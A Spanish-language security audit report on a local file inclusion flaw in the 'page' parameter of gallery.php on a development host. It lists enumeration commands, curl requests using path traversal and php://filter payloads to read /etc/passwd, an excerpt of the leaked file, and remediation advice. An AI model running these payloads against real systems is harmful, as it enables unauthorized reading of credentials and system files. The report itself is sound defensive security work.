# Informe de Auditoría LFI — 2026-04-27T07:30:06

Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
- Se identificó un punto de entrada vulnerable a Local File Inclusion (LFI) en el parámetro `page` de `gallery.php`.
- Se consiguió leer ficheros sensibles del sistema (ej. /etc/passwd) mediante traversal y `php://filter`.
- Impacto: lectura de archivos del sistema en contexto web; posible escalada a RCE con técnicas adicionales (log poisoning, inclusión remota si habilitada).

Detalles del hallazgo:

1) Punto vulnerable
- URL: http://web.dev.local:8081/gallery.php
- Parámetro: page
- Comportamiento: la aplicación incluye directamente el valor del parámetro `page` sin saneado, permitiendo traversal y wrappers de PHP.

2) Comandos y herramientas usadas (Kali)
- Reconocimiento y enumeración:
  - gobuster dir -u http://web.dev.local:8081 -w /usr/share/wordlists/dirb/common.txt -q
  - dirb http://web.dev.local:8081 /usr/share/wordlists/dirb/common.txt -r
  - nikto -h http://web.dev.local:8081 -Tuning 9
- Fuzzing parámetros:
  - ffuf -u http://web.dev.local:8081/index.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all
- Pruebas de LFI / explotación:
  - curl -G 'http://web.dev.local:8081/gallery.php' --data-urlencode 'page=../../../../../../etc/passwd'
  - curl -G 'http://web.dev.local:8081/gallery.php' --data-urlencode 'page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd'

3) Payloads que permitieron descubrir ficheros de la app
- Traversal básico: ../../../../../../etc/passwd
- PHP filter para extraer contenido base64: php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd

4) Evidencia
- Respuesta HTTP desde gallery.php?page=../../../../../../etc/passwd contenía el listado de usuarios del sistema (fragmento):

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...

- Uso de php://filter devolvió contenido codificado en base64 dentro de la respuesta de la página; decodificado se confirmó /etc/passwd.

5) Explotación adicional intentada
- Se intentó decodificar el resultado en el entorno de auditoría y se accedió al contenido de /etc/passwd (confirmado), por lo que la explotación se considera exitosa para lectura de archivos del sistema.
- No se procedió a publicar claves SSH ni hashes de /etc/shadow en este informe por seguridad del entorno, pero el mismo vector pudiera extraer dichos ficheros si los permisos lo permiten.

6) Recomendaciones
- Nunca incluir directamente parámetros del usuario en includes de archivos. Usar whitelist de páginas permitidas.
- Saneado estricto de entradas, rechazo de patrones de traversal (../) y deshabilitar wrappers peligrosos si no se necesitan.
- Configurar reglas en WAF para detectar patrones php://filter y traversal en parámetros.
- Revisar permisos de ficheros y minimizar accesos de usuario web.

Anexos: comandos y fragmentos relevantes ya listados arriba.

Fin del informe.
